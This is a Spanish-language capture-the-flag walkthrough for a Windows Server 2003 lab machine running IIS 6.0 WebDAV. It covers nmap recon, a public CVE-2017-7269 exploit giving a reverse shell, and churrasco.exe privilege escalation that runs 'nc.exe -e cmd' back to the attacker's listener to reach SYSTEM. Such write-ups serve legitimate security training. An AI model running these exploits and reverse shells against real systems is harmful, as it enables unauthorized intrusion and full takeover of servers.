## Summary

Tags: #Windows #HTTP #IIS #WebDav #Churrasco #JuicyPotato #Server2003 #SearchSploit 

- IP -> 10.10.10.14
- Ports -> TCP (80), UDP (idk)
- OS ->  Windows 
- Services & Applications
    - 80 -> 

## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon

```bash
❯ ping -c 1 ❮IP❯                             # Para saber si la maquina esta activa o no (ttl=64 Linux, ttl=128 Windows)

	# IP = IP Address de la maquina target 
	# c = Numero de pings a ejecutar
```

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts       # Escaneo en la Capa 4 del modelo OSI
```

```bash
❯ nmap -sCV -p80 ❮Target IP❯ -oN targeted
```

En la captura de Nmap además de encontrar que el puerto 80 esta abierto, podemos ver que nos sale los métodos permitidos.
```bash 
# Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND...
# Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH... 

	# PUT = Subir un archivo al servidor 
	# MOVE = 'Mover' el archivo o cambiarle de extension

# Type WebDav
```

```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
# Encontramos un IIS/6.0
```

Como vemos que hay un WebDav podemos usar la siguiente herramienta para testear que tipo de archivos podemos subir al servidor. Lo que hace la herramienta es que subirá todo tipo de archivos y nos reportara cuales si logro subir. 
```bash 
❯ davtest -url http://10.10.10.15 
```
Pero no podemos subir ningún tipo de archivo. 

Tendremos que buscar por Searchsploit
```bash
❯ searchsploit IIS 6.0                        # Para buscar un exploit
```

```bash 
❯ searchsploit -m 41738.py                    # Para descargarnos el exploit .py que nos ayudara a hacer el Buffer Overflow para el IIS 6.0

	# m = move


# O podemos clonarnos el siguiente directorio con un exploit mejor
❯ git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
```
Al momento de mirar el contenido del exploit, podemos observar que usa el método **PROPFIND** y este método si esta disponible en el servidor. 

Ejecutamos el exploit de la siguiente manera:
```python 
❯ python2 iis6.py <IP Victima> 80 <IP Atacante> 443

	# ip = IP de la maquina victima 
	# 80 = Puerto victima 
	# ip A = Ip de la maquina de atacante
	# 443 = Puerto a abrir de la maquina de atacante  
```

Antes de ejecutar el comando en la web, nos ponemos en escucha por el puerto 443 
```bash 
❯ rlwrap nc -nlvp 443
```

## User

```bash
❯ whoami                                     # Miramos el nombre del usuario
```
Ahora somos nt Authority \\ Network Service 

```bash
❯ ipconfig                                   # Nos muestra las interfaces y las direcciones IP
```

```bash 
❯ systeminfo                                 # Nos muestra la informacion del Windows
```


## Root

```bash
❯  whoami /priv                              # Miramos los privilegios que tenemos   
	
	# SetImpersonatePrivilege = En el cual podriamos usar RottenPotato o  JuicyPotato, este es para servers del 2003
```


Nos descargamos el de la siguiente pagina:
* [Juicy-Potato-Server-2003](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/)

Descargamos el archivo de churracco.exe y lo compartimos a la maquina victima por un servidor smb. 
```bash 
❯ impacket-smbserver smbFolder $(pwd) -smb2support           # Compartiremos el recurso de Netcat a nivel de red

	# smbFolder = Nombre de la carpeta que compartiremos a nivel de red 
	# pwd = Sincronizado con la ruta actual de trabajo
	# smb2support = Sporte a la version 2 de smb
```

En la consola de Windows para transferirnos el archivo, primero debemos de ir al dir **Temp** y después colocamos el siguiente comando. 
```python
❯ copy \\10.10.14.11\\smbFolder\\churrasco.exe churrasco.exe    # Nos copiamos un archivo .exe desde un recurso compartido SMB que se encuentra en nuestra maquina de atacante

	# IP = IP de atacante
	# smbFolder = Nombre del folder del recurso compartido
	# File.exe = Nombre del archivo .exe a copiar de la maquina de atacante
	# File.exe = Nombre del archivo .exe en el cual se depositara el archivo copiado
```

Ejecutamos el churrasco de la siguiente manera
```bash 
❯ churrasco.exe "\\10.10.14.11\\smbFolder\\nc.exe -e cmd 10.10.14.11 443"           # Al momento de ejecutar el churrasco debemos de colocar el comandos a ejecutar 
```

Pero antes compartirnos el Netcat a nivel de red para Windows, para después ejecutarlo desde el recurso compartido y el servidor de la maquina victima
```bash 
❯ impacket-smbserver smbFolder $(pwd) -smb2support           # Compartiremos el recurso de Netcat a nivel de red

	# smbFolder = Nombre de la carpeta que compartiremos a nivel de red 
	# pwd = Sincronizado con la ruta actual de trabajo
	# smb2support = Sporte a la version 2 de smb
```

Nos ponemos en escucha 
```bash 
❯ rlwrap nc -nlvp 443
```

Ahora somos NT Authority\\System
Buscamos la primer flag del usuario user.txt en Harry, en donde antes no nos podíamos meter y la segunda flag en Administrator